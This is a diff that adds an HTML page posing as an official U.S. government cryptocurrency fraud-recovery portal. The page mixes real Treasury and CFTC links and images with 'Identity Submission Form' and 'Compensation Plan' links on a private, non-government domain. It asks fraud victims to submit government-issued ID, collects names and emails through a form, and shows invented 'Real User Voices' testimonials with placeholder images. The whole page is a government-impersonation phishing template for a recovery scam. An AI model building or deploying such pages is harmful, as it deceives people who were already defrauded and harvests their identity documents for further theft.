@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>U.S. Government Official Website - Cryptocurrency Fraud Recovery</title>
+
+<!-- DataTables CSS -->
+<link rel="stylesheet" href="https://cdn.datatables.net/1.13.5/css/jquery.dataTables.min.css">
+
+<!-- jQuery -->
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+<!-- DataTables JS -->
+<script src="https://cdn.datatables.net/1.13.5/js/jquery.dataTables.min.js"></script>
+
+<style>
+  body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: #fff;
+    color: #333;
+  }
+
+  /* Top Section (Hero) */
+  .section {
+    display: flex;
+    background: #0a3d62; 
+    color: #ffffff;
+    padding: 40px 20px;
+    justify-content: center;
+  }
+
+  .content-wrapper {
+    max-width: 1200px;
+    width: 100%;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 30px;
+  }
+
+  .left-content {
+    flex: 1 1 300px;
+    min-width: 300px;
+  }
+
+  .right-content {
+    flex: 1 1 300px;
+    background: #ffffff;
+    color: #333333;
+    padding: 20px;
+    border-radius: 5px;
+    box-sizing: border-box;
+    min-width: 300px;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+  }
+
+  .logo-container {
+    margin-bottom: 20px;
+    text-align: left;
+  }
+
+  .government-logo {
+    max-width: 80px;
+    height: auto;
+    display: block;
+    margin-bottom: 15px;
+  }
+
+  .title {
+    font-size: 32px;
+    font-weight: bold;
+    line-height: 1.2;
+    margin: 0 0 20px;
+    max-width: 600px;
+  }
+
+  main .content-container {
+    font-size: 16px;
+    line-height: 1.6;
+    max-width: 600px;
+  }
+
+  main .content-container a {
+    color: #ffd700;
+    text-decoration: underline;
+  }
+
+  main .content-container p {
+    margin-bottom: 15px;
+  }
+
+  #verifyButton {
+    background: #eeeeee;
+    color: #333;
+    border: none;
+    padding: 12px 20px;
+    cursor: pointer;
+    font-size: 16px;
+    font-weight: bold;
+    margin-top: 20px;
+    text-align: center;
+    display: inline-block;
+    text-decoration: none;
+    border-radius: 3px;
+  }
+
+  #verifyButton:hover {
+    background: #e2e2e2;
+  }
+
+  .section-title {
+    font-size: 20px;
+    color: #003366;
+    font-weight: bold;
+    margin-bottom: 15px;
+    border-bottom: 2px solid #003366;
+    padding-bottom: 8px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .section-description {
+    font-size: 14px;
+    color: #555;
+    margin-bottom: 20px;
+    line-height: 1.5;
+  }
+
+  .resource-list a {
+    display: block;
+    padding: 10px 12px;
+    background-color: #e9f1ff;
+    color: #003366;
+    font-size: 14px;
+    text-decoration: none;
+    margin: 5px 0;
+    border-radius: 5px;
+    transition: background-color 0.3s;
+    font-weight: bold;
+  }
+
+  .resource-list a:hover {
+    background-color: #d0e5ff;
+  }
+
+  .btn {
+    display: inline-block;
+    background-color: #003366;
+    color: white;
+    padding: 10px 16px;
+    font-size: 14px;
+    text-decoration: none;
+    border-radius: 4px;
+    text-align: center;
+    margin-top: 15px;
+    transition: background-color 0.3s;
+    font-weight: bold;
+  }
+
+  .btn:hover {
+    background-color: #004080;
+  }
+
+  .carousel-container {
+    width: 100%;
+    margin: 0 auto;
+    overflow: hidden;
+    border-radius: 5px;
+    position: relative;
+  }
+
+  .carousel {
+    display: flex;
+    transition: transform 0.5s ease-in-out;
+  }
+
+  .carousel-item {
+    min-width: 100%;
+    box-sizing: border-box;
+    background: #fff;
+    border-radius: 5px;
+    padding: 15px;
+    box-shadow: 0 1px 4px rgba(0,0,0,0.1);
+  }
+
+  .carousel-controls {
+    display: flex;
+    justify-content: space-between;
+    position: absolute;
+    top: 50%;
+    width: 100%;
+    z-index: 10;
+    transform: translateY(-50%);
+  }
+
+  .carousel-controls button {
+    background-color: rgba(255,255,255,0.8);
+    border: none;
+    color: #003366;
+    font-size: 20px;
+    cursor: pointer;
+    transition: all 0.3s;
+    border-radius: 50%;
+    width: 35px;
+    height: 35px;
+  }
+
+  .carousel-controls button:hover {
+    background-color: #ffffff;
+    transform: scale(1.05);
+  }
+
+  .carousel-controls button:focus {
+    outline: 3px solid #ffbf47;
+  }
+
+  /* User Experience Sharing section */
+  .user-experiences {
+    max-width: 1200px;
+    margin: 40px auto;
+    padding: 0 20px;
+  }
+
+  .user-experiences h2 {
+    font-size: 24px;
+    font-weight: bold;
+    margin-bottom: 30px;
+    color: #0a3d62;
+    border-bottom: 2px solid #0a3d62;
+    padding-bottom: 10px;
+  }
+
+  .user-experiences p {
+    max-width: 700px;
+    line-height: 1.6;
+    font-size: 16px;
+    margin-bottom: 30px;
+  }
+
+  .carousel-caption h3 {
+    font-size: 18px;
+    margin-bottom: 15px;
+    color: #003366;
+  }
+
+  .carousel-caption p {
+    font-size: 14px;
+    line-height: 1.6;
+    color: #333333;
+    margin-bottom: 15px;
+  }
+
+  .carousel-images {
+    display: flex;
+    gap: 10px;
+  }
+
+  .carousel-images img {
+    width: 32%;
+    border-radius: 5px;
+    object-fit: cover;
+  }
+
+  /* Unclaimed Deposits Section */
+  .unclaimed-section {
+    max-width: 1200px;
+    margin: 40px auto;
+    padding: 0 20px;
+  }
+
+  .unclaimed-section h2 {
+    font-size: 24px;
+    font-weight: bold;
+    margin-bottom: 30px;
+    color: #0a3d62;
+    border-bottom: 2px solid #0a3d62;
+    padding-bottom: 10px;
+  }
+
+  .unclaimed-section p {
+    font-size: 16px;
+    line-height: 1.6;
+    margin-bottom: 20px;
+    color: #333333;
+    max-width: 600px;
+  }
+
+  table.dataTable thead th {
+    background-color: #0a3d62;
+    color: #fff;
+  }
+
+  table.dataTable tbody tr:hover {
+    background-color: #f0f0f0;
+  }
+
+  /* Additional Sections (FAQs, Reporting a Scam, Resources, etc.) */
+  .additional-sections {
+    max-width: 1200px;
+    margin: 40px auto;
+    padding: 0 20px;
+  }
+
+  .additional-sections h2 {
+    font-size: 24px;
+    font-weight: bold;
+    margin-bottom: 30px;
+    color: #0a3d62;
+    border-bottom: 2px solid #0a3d62;
+    padding-bottom: 10px;
+  }
+
+  .faq, .report-scam, .resources, .victim-support, .multilanguage, .legal-disclaimer, .id-verification {
+    margin-bottom: 40px;
+  }
+
+  .faq ul, .resources ul {
+    list-style-type: disc;
+    margin-left: 20px;
+  }
+
+  .faq li, .resources li {
+    margin-bottom: 10px;
+  }
+
+  .report-scam form input[type="text"], .report-scam form textarea {
+    width: 100%;
+    padding: 10px;
+    margin-bottom: 15px;
+    border-radius: 4px;
+    border: 1px solid #ccc;
+  }
+
+  .report-scam form button {
+    background: #003366;
+    color: #ffffff;
+    border: none;
+    padding: 10px 20px;
+    cursor: pointer;
+    font-size: 14px;
+    border-radius: 4px;
+  }
+
+  .report-scam form button:hover {
+    background: #004080;
+  }
+
+  .legal-disclaimer p, .victim-support p, .multilanguage p, .id-verification p {
+    font-size: 16px;
+    line-height: 1.6;
+    margin-bottom: 15px;
+  }
+
+  .id-verification a {
+    color: #0056b3;
+    text-decoration: underline;
+  }
+
+  @media (max-width: 768px) {
+    .resources ul, .faq ul {
+      margin-left: 15px;
+    }
+
+    .report-scam form input[type="text"], .report-scam form textarea, .report-scam form button {
+      width: 100%;
+    }
+  }
+</style>
+</head>
+<body>
+
+<!-- Hero and Introduction -->
+<div class="section">
+  <div class="content-wrapper">
+    <div class="left-content">
+      <div class="logo-container">
+        <img src="https://images.squarespace-cdn.com/content/672aaf4de9a9b56bf2eab856/0ba3e5b3-97fd-493a-b769-1022a7d50bbd/de71c232-94d4-408e-9df4-3b2742daeb26+%282%29.jpg?content-type=image%2Fjpeg" 
+             alt="Official U.S. Government Emblem" class="government-logo" loading="lazy">
+        <h1 class="title">Identification and Verification of Victims for Cryptocurrency Fraud Fund Recovery</h1>
+      </div>
+      <main>
+        <div class="content-container">
+          <p>
+            In Fiscal Year 2023, the U.S. Department of the Treasury employed advanced artificial intelligence methodologies to identify and recover $375 million in fraudulent cryptocurrency funds. For official details, please refer to the <a href="https://home.treasury.gov/news/press-releases/jy2134" target="_blank" rel="noopener">U.S. Department of the Treasury Official Press Release</a>. Our mission ensures that victims of cryptocurrency fraud receive timely and equitable compensation, thereby strengthening transparency and accountability.
+          </p>
+
+          <p>
+            Federal authorities emphasize that victim compensation is a top priority. For additional guidance, please review the <a href="https://www.cftc.gov/PressRoom/SpeechesTestimony/johnsonstatment080824" target="_blank" rel="noopener">Federal Official's Statement</a>. Going forward, we plan to expand our resources with Frequently Asked Questions (FAQs), multilingual support, official guidance documents, and secure submission portals to better serve victims and enhance public trust.
+          </p>
+
+          <a href="#" id="verifyButton" aria-label="Start Eligibility Verification Process" title="Start Eligibility Verification Process">Start Eligibility Verification Process</a>
+        </div>
+      </main>
+    </div>
+
+    <div class="right-content">
+      <div class="carousel-container" role="region" aria-label="Resource Carousel">
+        <div class="carousel">
+          <div class="carousel-item">
+            <div class="section-title">
+              <img src="https://www.cftc.gov/sites/default/files/2020-06/Balance_1%20%282%29.png" alt="Anti-Fraud Center Logo" width="40"> Match Recovery Funds
+            </div>
+            <div class="section-description">
+              Access resources related to identifying and matching cryptocurrency victims with recovered funds.
+            </div>
+            <div class="resource-list">
+              <a href="https://www.treasury.gov/services/Pages/Fraud.aspx" target="_blank">U.S. Treasury Fraud Services</a>
+              <a href="https://claims.ftx.com/privacy" target="_blank">FTX Claims Portal</a>
+              <a href="https://www.investvoyager.com/claim" target="_blank">Voyager Claims Portal</a>
+              <a href="https://registry.telexfreeclaims.com/#" target="_blank">BMC Claims Portal</a>
+              <a href="https://www.afconorthamerica.com/s/Identity_Information_Submission_Form.trc" target="_blank">Identity Submission Form</a>
+              <a href="https://www.afconorthamerica.com/s/Copy-of-Compensation-Program-Description.pdf" target="_blank">Compensation Plan</a>
+            </div>
+          </div>
+
+          <div class="carousel-item">
+            <div class="section-title">
+              <img src="https://www.cftc.gov/sites/default/files/2019-08/Whistle%20from%20whistleblower.gov__0.png" alt="Whistleblower Program Icon" width="40"> Whistleblower Program
+            </div>
+            <div class="section-description">
+              Learn about the whistleblower program and how you can submit confidential tips regarding potential cryptocurrency-related violations.
+            </div>
+            <div class="resource-list">
+              <a href="https://www.afconorthamerica.com/s/TCRSubmissionProcedures.pdf" target="_blank">Submission Procedures</a>
+              <a href="https://www.afconorthamerica.com/s/InstructionsforCompletingFormTCR.pdf" target="_blank">Instructions for Form TCR</a>
+              <a href="https://www.afconorthamerica.com/s/cftc_form_tcr-1.pdf" target="_blank">Download TCR Form</a>
+            </div>
+
+            <a href="#" class="btn">Submit a Whistleblower Tip</a>
+          </div>
+        </div>
+
+        <div class="carousel-controls">
+          <button onclick="prevSlide()" aria-label="Previous Slide"><i class="fas fa-chevron-left"></i></button>
+          <button onclick="nextSlide()" aria-label="Next Slide"><i class="fas fa-chevron-right"></i></button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- User Experience Sharing Section -->
+<section class="user-experiences">
+  <h2>User Experience Sharing</h2>
+  <p>
+    Each month, we highlight a verified testimonial from a victim who successfully reclaimed their fraudulently obtained cryptocurrency funds. To ensure authenticity and maintain public trust, all submitters must provide a government-issued ID during the submission process. This verification step helps guarantee the legitimacy of these firsthand accounts.<br><br>
+    Below are three selected testimonials from recent months: December 2024 (this month’s feature), November 2024, and October 2024.
+  </p>
+  <div class="carousel-container" role="region" aria-label="User Experience Voices">
+    <div class="carousel">
+      <!-- December 2024 User -->
+      <div class="carousel-item">
+        <div class="carousel-caption">
+          <h3>Real User Voices - December 2024</h3>
+          <p>
+            I still remember the thrill I felt when I first saw the returns from that so-called ‘investment’—it was like a dream come true. But then, as quickly as it started, the withdrawals stopped. They told me to ‘invest a little more’ to unlock my funds, and I believed them. Eventually, I realized I had been conned. I didn’t know who to trust anymore.<br><br>
+            Finding this official recovery resource, I was skeptical. But after submitting my ID and going through their transparent verification process, my doubts eased. One day, I saw my account balance updated—it was real. The funds I’d given up on were restored. I finally woke up from the nightmare.
+          </p>
+        </div>
+        <div class="carousel-images">
+          <img src="https://example.com/images/user-dec-1.jpg" alt="User Dec 1">
+          <img src="https://example.com/images/user-dec-2.jpg" alt="User Dec 2">
+          <img src="https://example.com/images/user-dec-3.jpg" alt="User Dec 3">
+        </div>
+      </div>
+
+      <!-- November 2024 User -->
+      <div class="carousel-item">
+        <div class="carousel-caption">
+          <h3>Real User Voices - November 2024</h3>
+          <p>
+            After months of uncertainty, I discovered this official platform. Although cautious, I submitted my government-issued ID as required. Their step-by-step guidance restored my confidence. Eventually, I reclaimed a substantial portion of my lost funds. This experience taught me that legitimate, verified avenues exist to assist victims like me.
+          </p>
+        </div>
+        <div class="carousel-images">
+          <img src="https://example.com/images/user-nov-1.jpg" alt="User Nov 1">
+          <img src="https://example.com/images/user-nov-2.jpg" alt="User Nov 2">
+          <img src="https://example.com/images/user-nov-3.jpg" alt="User Nov 3">
+        </div>
+      </div>
+
+      <!-- October 2024 User -->
+      <div class="carousel-item">
+        <div class="carousel-caption">
+          <h3>Real User Voices - October 2024</h3>
+          <p>
+            At first, I hesitated to trust another service. But this official site’s ID verification process and clear policies reassured me. Submitting my documents was straightforward. In time, I recovered funds I thought were lost forever. I learned the importance of relying on official, verified resources and understanding my rights as a victim.
+          </p>
+        </div>
+        <div class="carousel-images">
+          <img src="https://example.com/images/user-oct-1.jpg" alt="User Oct 1">
+          <img src="https://example.com/images/user-oct-2.jpg" alt="User Oct 2">
+          <img src="https://example.com/images/user-oct-3.jpg" alt="User Oct 3">
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Unclaimed Deposits Section -->
+<section class="unclaimed-section">
+  <h2>Unclaimed Deposits</h2>
+  <p>
+    If you believe you may have unclaimed cryptocurrency-related deposits recovered by the U.S. Government, please search the records below. Enter the last name or business name, and optionally the state, to locate matches. If results are found, follow the instructions to submit a claim.
+  </p>
+
+  <article>
+    <div class="body field-type-text_with_summary">
+      <h2>Unclaimed Deposits as of February 12, 2024</h2>
+    </div>
+    <!-- DataTables Table -->
+    <table id="example" class="display" style="width:100%">
+      <thead>
+        <tr>
+          <th scope="col">Last Name/Business Name</th>
+          <th scope="col">First Initial</th>
+          <th scope="col">MI</th>
+          <th scope="col">City</th>
+          <th scope="col">State</th>
+          <th scope="col">Credit Union Name</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>24/7 MAINTENANCE</td>
+          <td></td>
+          <td></td>
+          <td>FAIRVIEW PARK</td>
+          <td>OH</td>
+          <td>TAUPA LITHUANIAN</td>
+        </tr>
+        <tr>
+          <td>3 C'S TRANSPORTATION</td>
+          <td></td>
+          <td></td>
+          <td>FAIRVIEW PARK</td>
+          <td>OH</td>
+          <td>TAUPA LITHUANIAN</td>
+        </tr>
+      </tbody>
+    </table>
+  </article>
+</section>
+
+<!-- Additional Sections -->
+<div class="additional-sections">
+
+  <!-- FAQ Section -->
+  <section class="faq">
+    <h2>Frequently Asked Questions (FAQ)</h2>
+    <ul>
+      <li><strong>How can I submit my ID?</strong> You will be prompted during the claim process with instructions for secure ID upload.</li>
+      <li><strong>How long does it take to recover my funds?</strong> Processing times vary, but we strive to ensure timely reviews and transparency.</li>
+      <li><strong>What if I suspect a new scam?</strong> Immediately report it through our "Report a Scam" form below.</li>
+    </ul>
+  </section>
+
+  <!-- Reporting a Scam Section -->
+  <section class="report-scam">
+    <h2>Report a Scam</h2>
+    <p>If you have information about a potential cryptocurrency-related fraud or scam, please let us know. All reports remain confidential, and your input helps us protect the public and maintain the integrity of digital markets.</p>
+    <form>
+      <input type="text" name="fullname" placeholder="Your Full Name (required)">
+      <input type="text" name="email" placeholder="Your Email (required)">
+      <textarea name="details" rows="5" placeholder="Describe the suspicious activity or scam"></textarea>
+      <button type="submit">Submit Report</button>
+    </form>
+  </section>
+
+  <!-- Resources Section -->
+  <section class="resources">
+    <h2>Educational Resources</h2>
+    <p>Learn more about avoiding cryptocurrency fraud, understanding your rights, and how federal agencies work to protect you.</p>
+    <ul>
+      <li><a href="https://example.com/CryptoFraudPreventionGuide.pdf" target="_blank" rel="noopener">Official Crypto Fraud Prevention Guide (PDF)</a></li>
+      <li><a href="https://www.ftc.gov/" target="_blank" rel="noopener">Federal Trade Commission (FTC) Resources</a></li>
+      <li><a href="https://www.consumerfinance.gov/" target="_blank" rel="noopener">Consumer Financial Protection Bureau</a></li>
+    </ul>
+  </section>
+
+  <!-- Victim Support -->
+  <section class="victim-support">
+    <h2>Victim Support Contacts</h2>
+    <p>If you need immediate assistance or counseling, please contact our 24/7 support hotline at <strong>1-800-XXX-XXXX</strong> or email us at <a href="mailto:support@cryptorecovery.gov">support@cryptorecovery.gov</a>.</p>
+  </section>
+
+  <!-- Multilanguage Placeholder -->
+  <section class="multilanguage">
+    <h2>Multilingual Support</h2>
+    <p>We are working to provide this website in multiple languages to serve all communities. Please check back for updates.</p>
+  </section>
+
+  <!-- Legal Disclaimer and Compliance Info -->
+  <section class="legal-disclaimer">
+    <h2>Legal and Compliance</h2>
+    <p>All information and services provided are pursuant to applicable federal laws and regulations. Consult our official documentation and policies for details on data protection, user privacy, and legal obligations.</p>
+  </section>
+
+  <!-- ID Verification Guidance -->
+  <section class="id-verification">
+    <h2>ID Verification Instructions</h2>
+    <p>For instructions on how to securely submit your government-issued ID and other required documentation, please refer to our <a href="https://example.com/IDverificationinstructions" target="_blank" rel="noopener">ID Verification Guidelines</a>.</p>
+  </section>
+
+</div>
+
+<script>
+  // Carousel logic for the top resources section
+  let currentIndex = 0;
+  function updateCarousel(containerSelector) {
+    const carousel = document.querySelector(containerSelector + ' .carousel');
+    const items = carousel.querySelectorAll('.carousel-item');
+    const offset = -100 * currentIndex;
+    carousel.style.transform = `translateX(${offset}%)`;
+  }
+
+  function prevSlide() {
+    const carousel = document.querySelector('.right-content .carousel');
+    const items = carousel.querySelectorAll('.carousel-item');
+    currentIndex = (currentIndex - 1 + items.length) % items.length;
+    updateCarousel('.right-content');
+  }
+
+  function nextSlide() {
+    const carousel = document.querySelector('.right-content .carousel');
+    const items = carousel.querySelectorAll('.carousel-item');
+    currentIndex = (currentIndex + 1) % items.length;
+    updateCarousel('.right-content');
+  }
+
+  $(document).ready(function() {
+    // Unclaimed deposits DataTable initialization
+    $('#example').DataTable({
+      "pageLength": 10,
+      "language": {
+        "search": "Search:",
+        "lengthMenu": "Show _MENU_ entries per page",
+        "info": "Showing _START_ to _END_ of _TOTAL_ records",
+        "infoEmpty": "No records available",
+        "infoFiltered": "(filtered from _MAX_ total records)",
+        "zeroRecords": "No matching records found",
+        "paginate": {
+          "first": "First",
+          "last": "Last",
+          "next": "Next",
+          "previous": "Previous"
+        }
+      }
+    });
+  });
+</script>
+</body>
+</html>
